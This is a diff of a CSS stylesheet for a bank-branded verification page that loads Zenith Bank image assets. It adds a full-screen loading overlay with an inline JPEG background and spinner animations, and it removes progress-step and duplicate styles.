@@ -1,17 +1,19 @@
 body {
   background: url("https://onlineac.zenithbank.com/img/rightcross.svg")
     no-repeat center center/cover;
+  font-size: 16px;
+}
+
+input[type="text"],
+input[type="date"] {
+  font-size: 16px;
 }
 
 .container {
   display: flex;
   justify-content: space-between;
 }
-.sign {
-  overflow-y: hidden;
-  overflow: hidden;
-  height: auto;
-}
+
 a {
   text-decoration: none;
 }
@@ -20,78 +22,25 @@ a {
   width: 50%;
   background: url("https://onlineac.zenithbank.com/img/bvncross.svg") no-repeat
     center center/cover;
-  position: relative;
   color: white;
-  height: auto;
 }
 
 .overlay {
   background: red;
   color: white;
   padding: 20px;
-  height: auto;
+  height: 100%;
   display: flex;
   flex-direction: column;
   justify-content: center;
   text-align: center;
 }
 
-/* Right Panel with Gradient Overlay */
 .right-panel {
   width: 50%;
   padding: 40px;
-  position: relative;
 }
 
-/* Progress Container */
-.progress-container {
-  text-align: center;
-  margin-bottom: 20px;
-  display: flex;
-  justify-content: center;
-  flex-wrap: wrap;
-}
-
-.progress-line {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  position: relative;
-  width: 100%;
-  max-width: 600px;
-  margin: auto;
-}
-
-.step {
-  font-size: 12px;
-  width: 25%;
-  text-align: center;
-  position: relative;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
-
-.bar {
-  flex-grow: 1;
-  height: 3px;
-  background: lightgray;
-  position: relative;
-}
-
-.dot {
-  width: 14px;
-  height: 14px;
-  background: lightgray;
-  border-radius: 50%;
-  position: relative;
-}
-
-.dot.active {
-  background: red;
-}
-
-/* Verification Form */
 .verification-form {
   max-width: 400px;
   margin: auto;
@@ -128,7 +77,6 @@ button:not(:disabled) {
   background: red;
 }
 
-/* Responsive Styles */
 @media screen and (max-width: 767px) {
   .left-panel {
     display: none;
@@ -138,37 +86,6 @@ button:not(:disabled) {
     width: 100%;
     padding: 20px;
   }
-
-  .progress-line {
-    flex-direction: row;
-    justify-content: center;
-  }
-
-  .step {
-    width: auto;
-    flex-direction: row;
-    align-items: center;
-    display: flex;
-    gap: 5px;
-  }
-
-  .bar {
-    display: none;
-  }
-
-  .dot {
-    width: 14px;
-    height: 14px;
-  }
-}
-
-.overlay {
-  padding: 20px;
-  height: 100%;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  text-align: center;
 }
 
 .go-back {
@@ -191,8 +108,48 @@ button:not(:disabled) {
   transform: translateY(-50%);
 }
 
-.loading {
+#loadingOverlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: url("data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBw0NDQ0NCA0PDQgHCA0HBwcHDQ8IDQcNFREWFhURExMYHSggJCYxJxMTLTotJSk3Li4vFx8zSDMsNyktNTIBCgoKDQ0OFQ8PFSsZFR0rLi0tKy0rLS8rLSstKy0rKys4LS0tMC0rLy0sKzQtKy4rLTgtKystKysrLSsuLSsrK//AABEIAMIBAwMBIgACEQEDEQH/xAAbAAEBAQEBAQEBAAAAAAAAAAAAAQIDBQYHBP/EACsQAQEBAQABAgQFAwUAAAAAAAABEQIDEiEEMXHBBSJBYYETQuFDUVKCkf/EABoBAQEBAQEBAQAAAAAAAAAAAAABAgMEBQb/xAAiEQEBAQABAwMFAAAAAAAAAAAAARECAxIhIlGhBBMUMUH/2gAMAwEAAhEDEQA/APy8DHztfsQXDAQXAVBVBkUDEwxQMJDADDDARcMMBTDDABY1GY1Fc61GozG4rnWo3yzy6cqzjXMdOYzy6cxTG+Y3IzzHSRFxfHP8L3P8kjU5R0k8Yx6R2/pUNh2Pmk0GHU0BQAAAFAEABQAAAQA00ANXQWNRjWp00xY3G4zG4rnY1HTliOnMGW+Y6cscunKrI6cukjPLpIjci8x/X8P4NcPFztev8H43Lny/jXL0xnn4X2Hu8/CcySeS2d5t5k3Bjtrxfkx+SgOr6AAAAAAAAACggoCCgIKKIKIIs+c+oT5z6g7RuMxqNOVb5dOWOXTlWXTl15cuXXkajry6cxz5dYOkjv4Pm938M5m71788fm65/Xqfs8Dx3K9/8H66vt4us8l6npvPteM9937fu5Wbyjn9T44Wvo/6nE/5XP1/Nxv8YJ/S7ntzfH6Z7c+r1bn7jvlfB9L8VAxyfpAXAEFAQUBBQEFAQxQEFAQUBFAXEWfcWfcTHWNxmNRpyrfLpy5x05Vl05duXHl15Fjty6xx5dojpGo9n8G5nXj8l76snw3k47554/1NnWy/xzf/AH6vFf2/hvxPXF8nj45nV+M8PXh55638veX09T9/ez/sTN8p1+N5dOyft73Xl8lu3zccX5Xx2zu82e12jyvP8V471vm3ny9c899+PnM4t5lz3ujF5cteGdKe3xHwgCvpAKCCoAKAgAAoCCgIKAgoKigAT5/yE+4jtG+WI3GnGtxvlzjpyrNdOXXlx5deQjty6cuPLrKNyttS5dntZdlntZWNNTHScnp+P8W6nMnfPPV45nHq/Pz7SZPbnuT/AG/QebqNd1cfsdP2fOgObuAAAAAAAIoAAAAAAAKAAE+c+oT5z6g7RvliNRtwrcbjEbisV0jpy5R05VnXXl0jjK6Sh3OmmsSrqY33NaMgdzwQGHcAAAAAAARQAAAAAUAAAAWfp9UJ9wdo1GYsbjhW43GI1FcrXTlvmucrUaYtdua1K581qUxnXTTWdWCzk1oiDWvEVByexRAFEAUQBRAFEAUAAAUAQAACfcJ9wdY1GGtbeetRuVz1qVpyrpG5XKVqVXOu0rUrjK16mma66srl6mpUWO2oz6hHR44iuT2AgCiAKAAAAAKDXFn902N93j+zmy/vdE1yAFAAAAVqcsxuA1Yi6y1HLnG4srEq6rlXSVZXPWtac7HSVdc5V1WMdNalcdanQsdvUOeiNvPVByewVADFTV0EwxQDDAFEUAAAAAAAABY0wuia1q6yLGK0ahrTnY1q6zoMWN6usaausWOmkrnq6LI6aMaC4/mAYekARVEAUQBRAwU1AFEUUAAABRAFEBGjWdFZa1WRWcaE0Gca01nTVTGtNZ00Ma0Z0DGBBl01RAxdaGdXQA00NA00NA01DQBV0ADQANAA0ADRUBFEAXTUAXTUBMXTUAxdGdAxAFFAAAQCgCKAoAAAAAAAAAAAAAAAAAAAAgAAA//Z")
+    center center no-repeat;
+  background-size: cover;
+  z-index: 9999;
+  justify-content: center;
+  align-items: center;
+}
+
+.loading-wrapper {
+  position: relative;
+  width: 120px;
+  height: 120px;
+}
+
+.loading-img {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  z-index: 2;
+  position: absolute;
+  top: 20px;
+  left: 20px;
+  animation: pulseZoom 2s ease-in-out infinite;
+}
+
+.loader-circle {
+  width: 120px;
+  height: 120px;
+  border: 6px solid #ccc;
+  border-top: 6px solid #e11b22;
+  border-radius: 50%;
   animation: spin 1s linear infinite;
+  position: absolute;
+  top: 0;
+  left: 0;
 }
 
 @keyframes spin {
@@ -204,6 +161,12 @@ button:not(:disabled) {
   }
 }
 
-.success {
-  color: green;
+@keyframes pulseZoom {
+  0%,
+  100% {
+    transform: scale(0.5);
+  }
+  50% {
+    transform: scale(1);
+  }
 }
